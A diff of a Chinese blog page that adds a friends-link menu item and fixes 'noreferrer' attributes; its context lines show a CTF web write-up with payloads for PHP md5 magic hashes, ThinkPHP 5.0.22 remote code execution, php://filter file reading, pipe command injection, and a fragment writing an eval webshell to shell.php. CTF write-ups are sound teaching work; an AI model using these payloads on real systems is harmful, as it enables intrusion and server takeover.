@@ -58,7 +58,7 @@
             <a href="/" title="Braindance">Braindance</a>
         </div>
         <div class="menu">
-            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"> 文章 </a><a class="menu-item" href="/tags/" title="标签"> 标签 </a><a class="menu-item" href="/categories/" title="分类"> 分类 </a><a class="menu-item" href="/shuoshuo/" title="说说"> 说说 </a><a class="menu-item" href="/about/" title="关于"> 关于 </a><a class="menu-item" href="https://travellings.link" title="开往" rel="noopener noreferrer" target="_blank">🚇 开往 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"> 文章 </a><a class="menu-item" href="/tags/" title="标签"> 标签 </a><a class="menu-item" href="/categories/" title="分类"> 分类 </a><a class="menu-item" href="/shuoshuo/" title="说说"> 说说 </a><a class="menu-item" href="/about/" title="关于"> 关于 </a><a class="menu-item" href="/friend/" title="友链"> 友链 </a><a class="menu-item" href="https://travellings.link" title="开往" rel="noopener noreferrer" target="_blank">🚇 开往 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                         <input type="text" placeholder="搜些什么" id="search-input-desktop">
                         <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
                             <i class="fas fa-search fa-fw"></i>
@@ -100,7 +100,7 @@
                     <a href="#" onclick="return false;" class="search-cancel" id="search-cancel-mobile">
                         取消
                     </a>
-                </div><a class="menu-item" href="/posts/" title="文章">文章</a><a class="menu-item" href="/tags/" title="标签">标签</a><a class="menu-item" href="/categories/" title="分类">分类</a><a class="menu-item" href="/shuoshuo/" title="说说">说说</a><a class="menu-item" href="/about/" title="关于">关于</a><a class="menu-item" href="https://travellings.link" title="开往" rel="noopener noreffer" target="_blank">🚇开往</a><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
+                </div><a class="menu-item" href="/posts/" title="文章">文章</a><a class="menu-item" href="/tags/" title="标签">标签</a><a class="menu-item" href="/categories/" title="分类">分类</a><a class="menu-item" href="/shuoshuo/" title="说说">说说</a><a class="menu-item" href="/about/" title="关于">关于</a><a class="menu-item" href="/friend/" title="友链">友链</a><a class="menu-item" href="https://travellings.link" title="开往" rel="noopener noreferrer" target="_blank">🚇开往</a><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
                 <i class="fas fa-adjust fa-fw"></i>
             </a></div>
     </div>
@@ -162,7 +162,7 @@
                         本文最后更新于 <span class="timeago" datetime="2020-11-29T23:17:50" title="November 29, 2020">2020-11-29</span>，文中内容可能已过时。</div>
                 </div>
             </div><h1 id="前言" class="headerLink">
-    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>前言</h1><p>比赛地址：<a href="http://dmctf.vaala.cloud:81/" target="_blank" rel="noopener noreffer">http://dmctf.vaala.cloud:81</a></p>
+    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>前言</h1><p>比赛地址：<a href="http://dmctf.vaala.cloud:81/" target="_blank" rel="noopener noreferrer">http://dmctf.vaala.cloud:81</a></p>
 <p>这次先写Web题目部分，我最后的排名：</p>
 <p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130085338.png" title="img" data-thumbnail="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130085338.png">
         <img
@@ -287,7 +287,7 @@ else{
 <blockquote>
 <p>intval函数有个特性:”直到遇上数字或正负符号才开始做转换，再遇到非数字或字符串结束时(\0)结束转换”,在某些应用程序里由于对intval函数这个特性认识不够,错误的使用导致绕过一些安全判断导致安全漏洞</p>
 </blockquote>
-<p><strong>第二关</strong>利用PHP处理哈希字符串时会把”0E”开头的哈希值解释为0，所以选择两个值在md5加密后是以0E开头即可。payload：<code>v1=QNKCDZO&amp;v2=240610708</code>，这篇博客中还进一步的讲解了一些<a href="https://blog.csdn.net/qq_19980431/article/details/83018232" target="_blank" rel="noopener noreffer">md5函数的漏洞</a>。</p>
+<p><strong>第二关</strong>利用PHP处理哈希字符串时会把”0E”开头的哈希值解释为0，所以选择两个值在md5加密后是以0E开头即可。payload：<code>v1=QNKCDZO&amp;v2=240610708</code>，这篇博客中还进一步的讲解了一些<a href="https://blog.csdn.net/qq_19980431/article/details/83018232" target="_blank" rel="noopener noreferrer">md5函数的漏洞</a>。</p>
 <p><strong>第三关</strong>进行<code>$message-&gt;key</code>和<code>$key</code>进行判断，<code>$key</code>之前没有声明过故值为空，所以传入的<code>message</code>也为空即可。post中传入<code>message=</code> 即可。</p>
 <p><strong>完整payload</strong>：</p>
 <p>url: <code>http://dmctf.vaala.cloud:28113/?num=202020020a&amp;v1=QNKCDZO&amp;v2=240610708</code></p>
@@ -301,7 +301,7 @@ else{
             alt="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129202453.png">
     </a></p>
 <h2 id="thinkphp" class="headerLink">
-    <a href="#thinkphp" class="header-mark"></a>thinkphp</h2><p>看到框架首先去搜索框架的漏洞，参考了[<a href="https://blog.csdn.net/qq_37865996/article/details/107468816" target="_blank" rel="noopener noreffer">框架漏洞]Thinkphp系列漏洞【截至2020-07-20】</a></p>
+    <a href="#thinkphp" class="header-mark"></a>thinkphp</h2><p>看到框架首先去搜索框架的漏洞，参考了[<a href="https://blog.csdn.net/qq_37865996/article/details/107468816" target="_blank" rel="noopener noreferrer">框架漏洞]Thinkphp系列漏洞【截至2020-07-20】</a></p>
 <p>这道题利用ThinkPHP5.0.22版本的漏洞可以执行远程代码。Thinkphp在实现框架中的核心类Request的method方法实现了表单请求伪装。但由于对<code>$_POST[‘_method’]</code>属性校验不严格，导致攻击者可以通过变量覆盖掉Request类的属性并结合框架特性实现对任意函数的调用，从而实现远程代码执行。</p>
 <p>测试payload：</p>
 <p><strong>url</strong>： <code>?s=captcha</code></p>
@@ -395,7 +395,7 @@ class PlayerData
             alt="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129204724.jpg">
     </a></p>
 <h2 id="bingxie" class="headerLink">
-    <a href="#bingxie" class="header-mark"></a>bingxie</h2><p>首先根据提示：<strong>你需要一些特殊软件</strong>，再看题目联想到<a href="https://github.com/rebeyond/Behinder/releases" target="_blank" rel="noopener noreffer">Behinder</a>，首先下载工具。</p>
+    <a href="#bingxie" class="header-mark"></a>bingxie</h2><p>首先根据提示：<strong>你需要一些特殊软件</strong>，再看题目联想到<a href="https://github.com/rebeyond/Behinder/releases" target="_blank" rel="noopener noreferrer">Behinder</a>，首先下载工具。</p>
 <p>分析题目：</p>
 <p>源码：</p>
 <div class="highlight"><div class="chroma">
@@ -455,7 +455,7 @@ if ($md5==&#39;e95100&#39;)
 </code></pre></td></tr></table>
 </div>
 </div><p>代码16、17行使用GET方法获得<code>file</code>和<code>md5</code>参数，<code>file</code>经过filter函数过滤一些PHP协议，<code>md5</code>参数进行md5加密并截取前6位，判断是否为<code>e95100</code>，如果判定成功include包含<code>file</code>变量指定的文件。</p>
-<p>首先计算什么数进行md5加密后前六位是<code>e95100</code>。参考了<a href="https://stackoverflow.com/questions/21636042/getting-md5-with-certain-character-pattern" target="_blank" rel="noopener noreffer">Getting MD5 with certain character pattern</a>中的回答，使用脚本：</p>
+<p>首先计算什么数进行md5加密后前六位是<code>e95100</code>。参考了<a href="https://stackoverflow.com/questions/21636042/getting-md5-with-certain-character-pattern" target="_blank" rel="noopener noreferrer">Getting MD5 with certain character pattern</a>中的回答，使用脚本：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -498,7 +498,7 @@ while True:
 http://网址?md5=6666&amp;file=pphphp://fifilterlter/convert.base64-encode/resource=bingxie.pphphp
 </code></pre></td></tr></table>
 </div>
-</div><p>得到base64加密的文件，扔到CyberChef里面解码（附上CyberChef的<a href="https://github.com/gchq/CyberChef" target="_blank" rel="noopener noreffer">github项目地址</a>）：</p>
+</div><p>得到base64加密的文件，扔到CyberChef里面解码（附上CyberChef的<a href="https://github.com/gchq/CyberChef" target="_blank" rel="noopener noreferrer">github项目地址</a>）：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -618,7 +618,7 @@ else
 ?&gt;
 </code></pre></td></tr></table>
 </div>
-</div><p>后半部分根据Behinder的<a href="https://xz.aliyun.com/t/2774" target="_blank" rel="noopener noreffer">官方文档</a>和博客<a href="https://blog.csdn.net/weixin_39190897/article/details/109417674" target="_blank" rel="noopener noreffer">渗透测试-流量加密之冰蝎&amp;蚁剑</a>的讲解，认为这个文件是个冰蝎马，参考博客中对加密通信流程进行了讲解，链接的密码为第15行<code>$_GET['secret']</code>中的<code>secret</code>。但是php文件前半部分（代码第5-13行）还需绕过，看到md5函数可以利用上一题<strong>weak_type</strong>中提到的不同字符串加密后md5相同绕过。最后payload：</p>
+</div><p>后半部分根据Behinder的<a href="https://xz.aliyun.com/t/2774" target="_blank" rel="noopener noreferrer">官方文档</a>和博客<a href="https://blog.csdn.net/weixin_39190897/article/details/109417674" target="_blank" rel="noopener noreferrer">渗透测试-流量加密之冰蝎&amp;蚁剑</a>的讲解，认为这个文件是个冰蝎马，参考博客中对加密通信流程进行了讲解，链接的密码为第15行<code>$_GET['secret']</code>中的<code>secret</code>。但是php文件前半部分（代码第5-13行）还需绕过，看到md5函数可以利用上一题<strong>weak_type</strong>中提到的不同字符串加密后md5相同绕过。最后payload：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -822,7 +822,7 @@ echo &#34;&lt;!--\r\n&#34;.file_get_contents(__FILE__);
 </code></pre></td></tr></table>
 </div>
 </div><p>分析一波：判断post请求中的<code>token</code>，如果不为空则与<code>$_SESSION['token']</code>判断是否相等，相等输出flag，再往下看12-16行，如果为空的话使用当前时间作为随机数的种子，生成一个随机数并进行md5和sha1函数加密并存入<code>$_SESSION[‘token’]</code>。</p>
-<p>所以思路就是：<strong>我们需要知道生成的那个随机数的值</strong>，在网上搜到参考<a href="https://blog.csdn.net/zss192/article/details/104327432" target="_blank" rel="noopener noreffer">php伪随机数</a>，可以根据种子预测随机数。题目使用：</p>
+<p>所以思路就是：<strong>我们需要知道生成的那个随机数的值</strong>，在网上搜到参考<a href="https://blog.csdn.net/zss192/article/details/104327432" target="_blank" rel="noopener noreferrer">php伪随机数</a>，可以根据种子预测随机数。题目使用：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -891,7 +891,7 @@ date_default_timezone_set(&#39;Asia/Shanghai&#39;);
             alt="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211832.png">
     </a></p>
 <h2 id="pingpingping" class="headerLink">
-    <a href="#pingpingping" class="header-mark"></a>pingpingping</h2><p>进入以后是一个类似终端的界面，随便输几个指令提示：<strong>输入help获得提示</strong>，help以后又提示只能使用test和login，进入test以后提示输入url地址，所以这个才是符合题目的<code>pingpingping</code>，可以使用通道符<code>|</code>连接执行其他命令，搜索到了疑似本题的博客<a href="https://www.jianshu.com/p/fd7f9fcc9333" target="_blank" rel="noopener noreffer">GXYCTF–PingPingPing</a>，猜测flag很有可能还在根目录下，所以可以执行<code>cat /flag</code>输出，模仿博客中的构造方式把payload进行base64编码，使用sh执行命令，最终payload：</p>
+    <a href="#pingpingping" class="header-mark"></a>pingpingping</h2><p>进入以后是一个类似终端的界面，随便输几个指令提示：<strong>输入help获得提示</strong>，help以后又提示只能使用test和login，进入test以后提示输入url地址，所以这个才是符合题目的<code>pingpingping</code>，可以使用通道符<code>|</code>连接执行其他命令，搜索到了疑似本题的博客<a href="https://www.jianshu.com/p/fd7f9fcc9333" target="_blank" rel="noopener noreferrer">GXYCTF–PingPingPing</a>，猜测flag很有可能还在根目录下，所以可以执行<code>cat /flag</code>输出，模仿博客中的构造方式把payload进行base64编码，使用sh执行命令，最终payload：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -912,7 +912,7 @@ date_default_timezone_set(&#39;Asia/Shanghai&#39;);
             alt="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129230355.png">
     </a></p>
 <h2 id="p3webshell" class="headerLink">
-    <a href="#p3webshell" class="header-mark"></a>p3’webshell</h2><p>提示给了一个链接：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener noreffer">一些不包含数字和字母的webshell</a>，看了以后确实受益匪浅收获很多，但是对于这个题目来说是一个烟雾弹。（更正，是我没看后面题，后面题用到了这个提示，这篇文章会继续更新。）</p>
+    <a href="#p3webshell" class="header-mark"></a>p3’webshell</h2><p>提示给了一个链接：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener noreferrer">一些不包含数字和字母的webshell</a>，看了以后确实受益匪浅收获很多，但是对于这个题目来说是一个烟雾弹。（更正，是我没看后面题，后面题用到了这个提示，这篇文章会继续更新。）</p>
 <p>源码：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -991,7 +991,7 @@ command=fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[
             </noscript></div></article></div>
         </main><footer class="footer">
         <div class="footer-container"><div class="footer-line">
-                    由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.92.0">Hugo</a> 强力驱动&nbsp;|&nbsp;主题 - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreffer" title="DoIt 0.2.13"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                    由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.92.0">Hugo</a> 强力驱动&nbsp;|&nbsp;主题 - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.2.13"><i class="far fa-edit fa-fw"></i> DoIt</a>
                 </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer">Braindance</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
             <div class="footer-line"></div>
             <div class="footer-line">
